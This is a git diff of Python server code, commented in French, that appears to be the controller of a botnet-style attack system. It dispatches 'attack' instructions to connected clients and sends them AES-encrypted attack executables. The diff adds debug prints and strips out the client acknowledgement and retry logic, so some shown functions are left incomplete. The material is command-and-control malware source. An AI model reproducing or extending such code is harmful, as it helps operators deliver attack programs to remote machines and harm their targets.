@@ -54,7 +54,7 @@ def send_executable_to_client(attack_type, client_os, client_sym_key, client_iv,
         len_file_encrypted = len(file_encrypted)
         print("\t[+] Envoi de la taille de l'executable :", len_file_encrypted)
 
-        cipher_file_size= AES.new(client_sym_key, AES.MODE_CBC, iv=client_iv)
+        cipher_file_size = AES.new(client_sym_key, AES.MODE_CBC, iv=client_iv)
         file_size_encrypted = cipher_file_size.encrypt(pad(str(len_file_encrypted).encode(), AES.block_size))
         client_emission_queue.put(file_size_encrypted)
 
@@ -69,37 +69,27 @@ def send_executable_to_client(attack_type, client_os, client_sym_key, client_iv,
 
         # Compare si la taille de l'éxécutable envoyé à bien était reçu par le client
         if int(len_file_encrypted) == int(decrypt_size) :
+
+            #Envoi du fichier
             client_emission_queue.put(file_encrypted)
+            # print(file_encrypted)
+            # print(decrypt_size)
             print("\t[+] L'exécutable a été envoyé")
 
-
-            # reception du code retour du client
-            return_code_encrypted = client_reception_queue.get(timeout=3)
-            
-            cipher_len_buffer= AES.new(client_sym_key, AES.MODE_CBC, iv=client_iv)
-            return_code = unpad(cipher_len_buffer.decrypt(return_code_encrypted), AES.block_size).decode('utf-8')
-
-            if return_code == "OK":
-                return 1
-            else :
-                return 0
         else:
-            print("Les tailles ne correspondent pas.")
-            return 0 # Le client n'a pas reçu
+            print("\t[!] Les tailles ne correspondent pas.")
                         
     else:
         print("\t[!] L'exécutable n'a pas été trouvé sur le serveur")
-        return -1 # erreur concernant l'envoi
 
 
 
 def execute_attack(client, attack):
     print("\t[+] sending attack to " + str(client['addr']))
-    # print(client)
-    # print(attack)
 
     # Récupération des données de l'attaque
     print("\t[+] data de l'attack : " + str(attack))
+    print(type(attack[4]))
     attack_data = json.loads(attack[4])
     attack_type = attack[2]
     attack_id = attack[0]
@@ -114,30 +104,10 @@ def execute_attack(client, attack):
 
     print("\t[+] instruction envoyée")
 
+    #### fin
+
     # reception du message retourner par le client 
-    try :
-        cipher_dec = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
-        encrypted_data_received = client['reception_queue'].get(timeout=10)
-        pt = unpad(cipher_dec.decrypt(encrypted_data_received), AES.block_size).decode('utf-8')
-
-        if pt == "YES":
-            # le client à l'exécutable
-            print("\t[+] Le client à déja l'exécutable")
-        else:
-            # envoyer l'exécutable 
-            print("\t[!] Le client n'a pas l'exécutable")
-
-            client_received = 0
-
-            while client_received == 0 :
-                client_received = send_executable_to_client(attack_type, client['os'], client['sym_key'], client['iv'], client['reception_queue'], client['emission_queue'])
-
-                if client_received == -1:
-                    print("\t[!] L'executable n'est pas sur le serveur")
-
-    except Empty:
-        print("\t[!] Le client n'a pas répondu")
-        pass
+    
 
     
     # Recevoir le status final de l'envoi de l'exécutable
